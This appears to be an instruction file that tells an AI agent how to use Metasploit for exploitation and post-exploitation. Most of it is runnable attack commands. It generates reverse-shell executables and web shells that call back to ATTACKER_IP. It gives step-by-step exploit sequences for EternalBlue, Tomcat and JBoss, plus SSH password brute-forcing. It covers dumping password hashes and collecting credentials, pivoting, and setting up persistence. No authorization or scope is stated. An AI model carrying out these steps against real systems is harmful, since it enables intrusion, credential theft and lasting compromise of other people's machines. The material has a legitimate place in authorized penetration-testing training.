# Metasploit Framework Skill

Expert-level usage of the Metasploit Framework for exploitation and post-exploitation.

## Trigger

Use when asked to use Metasploit, run exploits, set up listeners, or perform advanced exploitation.

## Quick Reference

### Starting Metasploit
```bash
# Start with database
msfdb start
msfconsole

# Quick start without banner
msfconsole -q

# Execute commands directly
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

### Core Commands
```
search <term>       # Search for modules
use <module>        # Load a module
info                # Show module info
show options        # Show required options
set <opt> <value>   # Set option
setg <opt> <value>  # Set global option
run / exploit       # Execute module
back                # Exit current module
sessions            # List active sessions
sessions -i <id>    # Interact with session
```

## Common Workflows

### 1. Setting Up a Listener

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j
```

### 2. Generating Payloads (msfvenom)

**Windows Reverse Shell**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
```

**Linux Reverse Shell**:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf
```

**Web Payloads**:
```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > shell.war

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx > shell.aspx
```

### 3. Common Exploits

**EternalBlue (MS17-010)**:
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
exploit
```

**Tomcat Manager Upload**:
```
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS TARGET_IP
set RPORT 8080
set HttpUsername admin
set HttpPassword admin
set PAYLOAD java/meterpreter/reverse_tcp
exploit
```

**JBoss JMXInvoker**:
```
use exploit/multi/http/jboss_invoke_deploy
set RHOSTS TARGET_IP
exploit
```

### 4. Auxiliary Scanners

**SMB Version**:
```
use auxiliary/scanner/smb/smb_version
set RHOSTS TARGET_IP
run
```

**HTTP Enumeration**:
```
use auxiliary/scanner/http/http_version
set RHOSTS TARGET_IP
run
```

**SSH Brute Force**:
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS TARGET_IP
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

## Post-Exploitation (Meterpreter)

### Basic Commands
```
sysinfo             # System information
getuid              # Current user
getpid              # Current process
ps                  # List processes
migrate <pid>       # Migrate to process
shell               # Drop to system shell
background          # Background session
```

### File Operations
```
pwd                 # Current directory
ls                  # List files
cd <dir>            # Change directory
download <file>     # Download file
upload <file>       # Upload file
cat <file>          # Read file
edit <file>         # Edit file
search -f <pattern> # Search for files
```

### Privilege Escalation
```
getsystem           # Attempt privesc
hashdump            # Dump password hashes
run post/multi/recon/local_exploit_suggester
```

### Pivoting
```
# Add route through session
run autoroute -s 192.168.1.0/24

# Port forwarding
portfwd add -l 8080 -p 80 -r 192.168.1.100

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
```

### Persistence
```
run persistence -U -i 5 -p 4444 -r ATTACKER_IP
run post/windows/manage/enable_rdp
```

## Important Modules by Category

### Scanning
- `auxiliary/scanner/portscan/tcp`
- `auxiliary/scanner/smb/smb_ms17_010`
- `auxiliary/scanner/http/dir_scanner`
- `auxiliary/scanner/ssh/ssh_enumusers`

### Exploitation
- `exploit/windows/smb/ms17_010_eternalblue`
- `exploit/windows/smb/psexec`
- `exploit/multi/http/apache_mod_cgi_bash_env_exec` (Shellshock)
- `exploit/unix/webapp/drupal_drupalgeddon2`
- `exploit/multi/http/struts2_content_type_ognl`

### Post-Exploitation
- `post/multi/recon/local_exploit_suggester`
- `post/windows/gather/credentials/credential_collector`
- `post/linux/gather/hashdump`
- `post/multi/manage/shell_to_meterpreter`

## Record Findings

Use `record_finding` for:
- Each successful exploit
- Vulnerable services identified
- Credentials obtained
- Access achieved
